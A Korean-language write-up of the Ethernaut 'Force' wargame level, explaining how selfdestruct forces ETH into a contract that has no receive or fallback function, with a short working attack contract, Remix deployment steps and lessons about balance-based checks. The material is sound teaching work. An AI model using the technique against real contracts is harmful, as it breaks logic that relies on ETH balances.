# Ethernaut Level 7 - Force

## 문제 설명

빈 컨트랙트에 ETH를 강제로 전송하는 것이 목표이다.
`receive()`, `fallback()` 함수가 없어도 ETH를 보낼 수 있는 방법을 찾아야 한다.

---

## 컨트랙트 분석

```solidity
contract Force {
    // 아무 코드도 없음
}
```

---

## 취약점 분석

### 1. selfdestruct

`selfdestruct(address)`는 컨트랙트를 파괴하면서
**잔액을 지정된 주소로 강제 전송**한다.

- 대상 컨트랙트에 `receive()`, `fallback()` 함수가 없어도 전송됨
- 이것이 유일한 "강제 전송" 방법

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor() payable {}

    function attack(address payable _target) public {
        selfdestruct(_target);
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포

Remix에서 `ForceAttack` 배포 시 **Value** 칸에 `1 wei` 이상 입력

### Step 2 — attack 실행

```
_target : Force 인스턴스 주소
```

transact 클릭 후 MetaMask 승인

### Step 3 — 확인

```js
await getBalance(contract.address)
// → "0.000000000000000001" (또는 그 이상)
```

---

## 핵심 교훈

- `selfdestruct`를 통한 강제 ETH 전송은 막을 수 없다
- `address(this).balance == 0` 검증 조건은 우회 가능
- ETH 잔액에 의존한 로직은 신뢰할 수 없다
